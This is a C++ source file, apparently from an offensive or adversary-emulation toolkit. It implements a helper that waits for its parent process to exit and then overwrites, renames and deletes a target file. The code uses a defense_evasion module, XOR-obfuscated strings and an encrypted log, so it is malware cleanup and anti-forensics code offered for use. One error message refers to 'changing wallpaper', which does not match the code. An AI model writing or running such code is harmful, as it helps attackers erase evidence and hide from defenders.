#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <iostream>
#include <format>
#include <exception>
#include <chrono>
#include <thread>
#include "argparser.hpp"
#include "base64.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "defense_evasion.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"

// to enable stdout logging in plaintext
#ifndef DEBUG_LOGGING
    #define DEBUG_LOGGING false
#endif

int main(int argc, char* argv[]) {
    std::vector<unsigned char> key = {
        0x5a, 0x52, 0xac, 0x49, 0xe0, 0x70, 0xfb, 0x1b, 0x0a, 0x4e, 0xbb, 0x30, 0xd2, 0x81, 0x21, 0xbe, 
        0x37, 0x65, 0xf4, 0xb7, 0xa4, 0x10, 0x5f, 0xbb, 0xd8, 0xd8, 0xf5, 0x36, 0xa9, 0x5f, 0x07, 0x70, 
        0x72, 0xe2, 0xd4, 0xc8, 0xd2, 0xa2, 0x37, 0x08, 0xee, 0xc2, 0x2e, 0xf2, 0x12, 0x24, 0x68, 0x6d, 
        0x8e, 0x15, 0x80, 0x84, 0xdb, 0x2d, 0x6d, 0x97, 0xb2, 0xc4, 0x9b, 0xc6, 0x87, 0x61, 0x8d, 0x9e,
        0xb3, 0x0e, 0x00, 0xe6, 0x74, 0x7b, 0xeb, 0xce, 0x19, 0x48, 0xb9, 0xaa, 0x4a, 0x28, 0x65, 0xef, 
        0xb8, 0xd5, 0x4d, 0x08, 0x28, 0x42, 0x3a, 0xaf, 0x2f, 0x73, 0xd0, 0xa4, 0x86, 0x6e, 0xe5, 0xee, 
        0xca, 0x94, 0x31, 0x2c, 0x49, 0x02, 0x97, 0x12, 0xff, 0xbd, 0xab, 0x08, 0x6f, 0x9a, 0x09, 0xab, 
        0xfd, 0x73, 0x0c, 0x4d, 0x71, 0x15, 0x56, 0xff, 0x79, 0x7e, 0xd7, 0xef, 0x29, 0xcf, 0xe5, 0x82
    };

    // Initialize logger
    int init_result = XorLogger::InitializeLogger(XOR_LIT("lbsd.log"), key);
    if (init_result != 0) {
        std::cerr << XOR_LIT("Failed to initialize logger. Error code: ") << init_result << std::endl;
        return init_result;
    }

    XorLogger::LogInfo(XOR_LIT("Initialized logger."));

    // Parse command lines
    ArgParser args(argc, argv);
    args.SetStringArg("-p"); // path of file to delete
    try {
        args.Parse();
    } catch (std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to parse command-line args"), e.what()));
        return 1;
    }

    std::string target_file = args.GetStringArg("-p");
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Target file from command-line"), target_file));

    // Wait for parent process to terminate
    std::this_thread::sleep_for(std::chrono::milliseconds(5000));

    // Delete file
    try {
        if (!defense_evasion::OverWriteRenameAndDeleteFile(string_util::string_to_wstring(target_file))) {
            XorLogger::LogError(XOR_LIT("Failed to overwrite, rename, and delete target file."));
        } else {
            XorLogger::LogInfo(XOR_LIT("Overwrote, renamed, and deleted."));
        }
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when changing wallpaper."));
    }

    return 0;
}